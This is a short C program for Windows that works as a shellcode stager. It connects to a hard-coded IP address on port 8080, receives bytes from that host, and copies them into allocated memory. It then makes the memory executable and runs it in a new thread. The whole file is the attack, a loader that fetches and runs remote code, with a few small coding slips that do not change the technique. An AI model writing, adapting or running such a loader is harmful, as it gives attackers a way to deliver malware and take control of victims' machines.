#include<stdio.h>
#include<winsock2.h>
#pragma warning(disable:4996)
//Winsock Library
#pragma comment(lib,"ws2_32.lib")


int main(int argc, char** argv) {
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	char* message;
	unsigned char sh3llcode[2048];
	int recv_size;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET);

	server.sin_addr.s_addr = inet_addr("201.37.147.130");
	server.sin_family = AF_INET;
	server.sin_port = htons(8080);

	if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
	{
		return 1;
	}

	if ((recv_size = recv(s, sh3llcode, 1024, 0)) == SOCKET_ERROR)

	sh3llcode[recv_size];
	printf("\nRecibi shell code");

	PROCESS_INFORMATION addrspace = { 0 };
	DWORD dwOldProtect = 0x04;

	LPVOID addressPointer = VirtualAlloc(addrspace.hProcess, sizeof(sh3llcode), 0x3000, 0x04);

	RtlMoveMemory(addressPointer, sh3llcode, sizeof(sh3llcode));
	
	VirtualProtect(addressPointer, sizeof(sh3llcode), 0x20, &dwOldProtect);
	
	CreateThread(addrspace.hProcess, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);

	Sleep(10000);

	return 0;
}